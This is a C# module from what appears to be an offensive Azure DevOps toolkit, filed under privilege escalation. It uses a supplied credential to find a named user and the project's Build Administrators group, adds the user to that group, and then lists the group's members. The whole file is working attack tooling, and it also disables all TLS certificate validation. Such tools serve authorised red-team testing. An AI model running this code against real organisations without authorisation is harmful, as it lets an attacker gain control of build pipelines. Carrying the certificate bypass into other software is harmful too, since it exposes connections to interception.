﻿using System;
using System.Net;
using System.Threading.Tasks;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using System.Collections.Generic;

namespace ADOKit.Modules.Privesc
{
    class AddBuildAdmin
    {


        public static async Task execute(string credential, string url, string projectName, string username)
        {
            // Generate module header
            Console.WriteLine(Utilities.ArgUtils.GenerateHeader("addbuildadmin", credential, url, "", projectName, "", username));

            // ignore SSL errors
            ServicePointManager.ServerCertificateValidationCallback = delegate (object s, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) { return true; };
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            // check if credentials provided are valid
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Checking credentials provided");
            Console.WriteLine("");

            // if creds valid, then provide message and continue
            if (await Utilities.WebUtils.credsValid(credential, url))
            {
                Console.WriteLine("[+] SUCCESS: Credentials provided are VALID.");
                Console.WriteLine("");

                Console.WriteLine("attempting to find user and group descriptors");

                try
                {
                    // these 2 values are needed to add a user to a group
                    string userDescriptor = "";
                    string groupDescriptor = "";

                    // get a listing of all users in the Azure DevOps instance
                    List<Objects.User> userList = await Utilities.UserUtils.getAllUsers(credential, url);

                    // iterate through the list of users and find our user. this is way to get the user descriptor.
                    foreach (Objects.User user in userList)
                    {

                        // if we have found our user, keep going to get the user descriptor and group descriptor
                        if (user.directoryAlias.ToLower().Equals(username.ToLower()))
                        {

                            // fetch the user details so we can get the descriptor
                            Objects.User ourUser = await Utilities.UserUtils.getUserDetails(credential, url, user.descriptor, user.principalName);
                            userDescriptor = ourUser.descriptor;

                            // get a listing of groups for the project we are wanting to add our user to as a build admin
                            List<Objects.Group> groupList = await Utilities.GroupUtils.getGroupPermissionsForProject(credential, url, projectName);

                            // iterate through the list of groups for the project and get the descriptor for the build administrators group
                            foreach (Objects.Group group in groupList)
                            {

                                if (group.displayName.ToLower().Equals("build administrators"))
                                {
                                    groupDescriptor = group.descriptor;

                                }

                            }

                        }

                    }

                    if (groupDescriptor == "")
                    {
                        Console.WriteLine("[-] ERROR: We didn't find a group descriptor - there wasn't a match. Stopping.");
                        return;
                    }
                    if (userDescriptor == "")
                    {
                        Console.WriteLine("[-] ERROR: We didn't find a user descriptor - there wasn't a match. Stopping.");
                        return;
                    }

                    Console.WriteLine("");
                    Console.WriteLine("[*] INFO: Attempting to add " + username + " to the Build Administrators group for the " + projectName + " project.");
                    Console.WriteLine("[*] INFO: groupdescriptor " + groupDescriptor + " userdescriptor " + userDescriptor);
                    Console.WriteLine("");

                    // add user to group now that we have the user descriptor and group descriptor
                    bool userAdded = await Utilities.GroupUtils.addUserToGroup(credential, url, userDescriptor, groupDescriptor);

                    // if user was added successfully, display message and list the members of the build admin group
                    if (userAdded)
                    {
                        Console.WriteLine("[+] SUCCESS: User successfully added");
                        Console.WriteLine("");

                        // get a listing of groups for our project that we added the user to
                        List<Objects.Group> groupList = await Utilities.GroupUtils.getGroupPermissionsForProject(credential, url, projectName);

                        // iterate through the list of groups for the project and list the members of the build administrators group
                        foreach (Objects.Group group in groupList)
                        {
                            // if the group is project administrators
                            if (group.displayName.ToLower().Equals("build administrators"))
                            {
                                // get group member list based on the group descriptor
                                List<Objects.GroupMember> groupMemberList = await Utilities.GroupUtils.getGroupMembers(credential, url, group.descriptor);

                                // create table header for listing group members
                                string tableHeaderMembers = string.Format("{0,70} | {1,50} | {2,50}", "Group", "Mail Address", "Display Name");
                                Console.WriteLine(tableHeaderMembers);
                                Console.WriteLine(new String('-', tableHeaderMembers.Length));

                                // go through each group member in the group and list them
                                foreach (Objects.GroupMember member in groupMemberList)
                                {
                                    Console.WriteLine("{0,70} | {1,50} | {2,50}", group.principalName, member.mailAddress, member.displayName);
                                }

                            }

                        }

                    }
                    else
                    {
                        Console.WriteLine("[-] ERROR: User was NOT successfully added");
                        Console.WriteLine("");
                    }

                    Console.WriteLine("");

                }
                catch (Exception ex)
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: " + ex.Message);
                    Console.WriteLine("[-] ERROR: " + ex.StackTrace);
                    Console.WriteLine("");
                }

            }

            // if creds not valid, display message and return
            else
            {
                Console.WriteLine("[-] ERROR: Credentials provided are INVALID. Check the credentials again.");
                Console.WriteLine("");
                return;
            }
        }


    }
}
